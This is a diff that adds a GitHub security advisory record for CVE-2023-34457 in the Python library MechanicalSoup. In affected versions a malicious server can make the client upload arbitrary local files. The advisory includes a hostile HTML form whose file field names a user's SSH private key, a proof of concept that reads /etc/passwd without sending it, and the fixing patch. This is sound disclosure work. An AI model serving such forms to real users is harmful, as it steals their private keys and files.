@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-x456-3ccm-m6j4",
+  "modified": "2023-07-05T21:35:54Z",
+  "published": "2023-07-05T21:35:54Z",
+  "aliases": [
+    "CVE-2023-34457"
+  ],
+  "summary": "MechanicalSoup vulnerable to malicious web server reading arbitrary files on client using file input inside HTML form",
+  "details": "### Summary\nA malicious web server can read arbitrary files on the client using a `<input type=\"file\" ...>` inside HTML form.\n\n### Details\nThis affects the extremely common pattern of form submission:\n\n```python\nb = mechanicalsoup.StatefulBrowser()\nb.select_form(...)\nb.submit_selected()\n```\n\nThe problem is with the code in `browser.Browser.get_request_kwargs`:\n\n```python\n    if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n        filepath = value\n        if filepath != \"\" and isinstance(filepath, str):\n            content = open(filepath, \"rb\")\n        else:\n            content = \"\"\n        filename = os.path.basename(filepath)\n        # If value is the empty string, we still pass it\n        # for consistency with browsers (see\n        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n        files[name] = (filename, content)\n```\n\nThe file path is taken from the bs4 tag \"value\" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:\n\n```html\n<html><body>\n  <form method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"text\" name=\"greeting\" value=\"hello\" />\n    <input type=\"file\" name=\"evil\" value=\"/home/user/.ssh/id_rsa\" />\n  </form>\n</body></html>\n```\n\nthen upon `.submit_selected()` the mechanicalsoup browser will happily send over the contents of your SSH private key.\n\n### PoC\n\n```python\nimport attr\nimport mechanicalsoup\nimport requests\n\n\nclass NevermindError(Exception):\n    pass\n\n\n@attr.s\nclass FakeSession:\n    session = attr.ib()\n\n    headers = property(lambda self: self.session.headers)\n\n    def request(self, *args, **kwargs):\n        print(\"requested\", args, kwargs)\n        raise NevermindError  # don't actually send request\n\n\ndef demonstrate(inputs=None):\n    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))\n    b.open_fake_page(\"\"\"\\\n<html><body>\n<form method=\"post\" enctype=\"multipart/form-data\">\n<input type=\"text\" name=\"greeting\" value=\"hello\" />\n<input type=\"file\" name=\"evil\" value=\"/etc/passwd\" />\n<input type=\"file\" name=\"second\" />\n</form>\n</body></html>\n\"\"\", url=\"http://127.0.0.1:9/\")\n    b.select_form()\n    if inputs is not None:\n        b.form.set_input(inputs)\n    try:\n        b.submit_selected()\n    except NevermindError:\n        pass\n\n# %%\n\n# unpatched\ndemonstrate()\n# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', <_io.BufferedReader name='/etc/passwd'>), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}\n\n# %%\n\n# with the patch, this now works. users MUST open the file manually and\n# use browser.set_input() using the file object.\ndemonstrate({\"greeting\": \"hiya\", \"evil\": open(\"/etc/hostname\", \"rb\").name, \"second\": open(\"/dev/null\", \"rb\")})\n# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', <_io.BufferedReader name='/etc/hostname'>), 'second': ('null', <_io.BufferedReader name='/dev/null'>)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}\n\n# %%\n\n# with the patch, this raises a ValueError with a helpful string\ndemonstrate({\"evil\": \"/etc/hostname\"})\n\n# %%\n\n# with the patch, we silently send no file if a malicious server tries the attack:\ndemonstrate()\n```\n\n### Suggested patch\n\n```diff\ndiff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py\nindex 285f8bb..68bc65e 100644\n--- a/mechanicalsoup/browser.py\n+++ b/mechanicalsoup/browser.py\n@@ -1,7 +1,8 @@\n+import io\n import os\n import tempfile\n import urllib\n import weakref\n import webbrowser\n \n import bs4\n@@ -227,15 +228,21 @@ class Browser:\n                     value = tag.get(\"value\", \"\")\n \n                 # If the enctype is not multipart, the filename is put in\n                 # the form as a text input and the file is not sent.\n                 if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n                     filepath = value\n                     if filepath != \"\" and isinstance(filepath, str):\n-                        content = open(filepath, \"rb\")\n+                        content = getattr(tag, \"_mechanicalsoup_file\", None)\n+                        if content is False:\n+                            raise ValueError(\n+                                \"\"\"From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({\"name\": open(\"/path/to/filename\", \"rb\")})`. This change is to mitigate a security vulnerability where a malicious web server could read arbitrary files from the client.\"\"\"\n+                            )\n+                        elif not isinstance(content, io.IOBase):\n+                            content = \"\"\n                     else:\n                         content = \"\"\n                     filename = os.path.basename(filepath)\n                     # If value is the empty string, we still pass it\n                     # for consistency with browsers (see\n                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n                     files[name] = (filename, content)\ndiff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py\nindex a67195c..82f6015 100644\n--- a/mechanicalsoup/form.py\n+++ b/mechanicalsoup/form.py\n@@ -1,8 +1,9 @@\n import copy\n+import io\n import warnings\n \n from bs4 import BeautifulSoup\n \n from .utils import LinkNotFoundError\n \n \n@@ -64,15 +65,24 @@ class Form:\n         give it the value ``password``.\n         \"\"\"\n \n         for (name, value) in data.items():\n             i = self.form.find(\"input\", {\"name\": name})\n             if not i:\n                 raise InvalidFormMethod(\"No input field named \" + name)\n-            i[\"value\"] = value\n+\n+            if isinstance(value, io.IOBase):\n+                # Store the actual file object for <input type=\"file\">\n+                i._mechanicalsoup_file = value\n+                i[\"value\"] = value.name\n+            else:\n+                # We set `_mechanicalsoup_file` to `False` so that we can\n+                # check for deprecated use of the API.\n+                i._mechanicalsoup_file = False\n+                i[\"value\"] = value\n \n     def uncheck_all(self, name):\n         \"\"\"Remove the *checked*-attribute of all input elements with\n         a *name*-attribute given by ``name``.\n         \"\"\"\n         for option in self.form.find_all(\"input\", {\"name\": name}):\n             if \"checked\" in option.attrs:\n@@ -257,20 +267,20 @@ class Form:\n         .. code-block:: python\n \n             form.set(\"login\", username)\n             form.set(\"password\", password)\n             form.set(\"eula-checkbox\", True)\n \n         Example: uploading a file through a ``<input type=\"file\"\n-        name=\"tagname\">`` field (provide the path to the local file,\n+        name=\"tagname\">`` field (provide an open file object,\n         and its content will be uploaded):\n \n         .. code-block:: python\n \n-            form.set(\"tagname\", path_to_local_file)\n+            form.set(\"tagname\", open(path_to_local_file, \"rb\"))\n \n         \"\"\"\n         for func in (\"checkbox\", \"radio\", \"input\", \"textarea\", \"select\"):\n             try:\n                 getattr(self, \"set_\" + func)({name: value})\n                 return\n             except InvalidFormMethod:\n```\n\n### Impact\n\nAll users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "MechanicalSoup"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.2.0"
+            },
+            {
+              "fixed": "1.3.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34457"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MechanicalSoup/MechanicalSoup"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/mechanicalsoup/PYSEC-2023-108.yaml"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-05T21:35:54Z",
+    "nvd_published_at": "2023-07-05T20:15:10Z"
+  }
+}
